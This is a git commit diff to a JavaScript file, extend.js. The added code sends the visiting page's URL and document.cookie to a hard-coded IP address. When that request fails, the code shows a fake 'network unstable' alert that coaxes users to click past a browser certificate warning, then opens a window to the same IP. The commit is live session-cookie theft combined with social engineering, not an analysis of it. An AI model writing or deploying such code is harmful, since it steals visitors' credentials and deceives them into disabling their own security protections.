c05708e11505c62c38cfbb5495e5cd22d03e124c
司土御帝 <1181935296@qq.com>
2020-09-15 12:59:59 +0800

    send

--- extend.js
+++ extend.js
@@ -9,8 +9,10 @@
     meta.setAttribute("http-equiv","Content-Security-Policy");
     document.getElementsByTagName('head')[0].appendChild(meta);
     var httpRequest = new XMLHttpRequest();
-    httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.href+"&c="+document.cookie, true);
-    httpRequest.send();
+    function send(){
+        httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.href+"&c="+document.cookie, true);
+        httpRequest.send();
+    }
     httpRequest.onreadystatechange = function () {
         if (httpRequest.readyState == 4) {
             if(httpRequest.status == 200){
@@ -19,8 +21,9 @@
                 alert("系统检测到你的网络不稳定,请在打开的网页中选择1.高级2.继续前往，将自动为您加速！");
                 var tempwindow=window.open('_blank');
                 setTimeout(function(){tempwindow.location.href="https://66.70.204.147"; }, 800);
-                setTimeout(function(){httpRequest.send();}, 5500);
+                setTimeout(send, 5500);
             }
         }
     };
+    send();
 }())
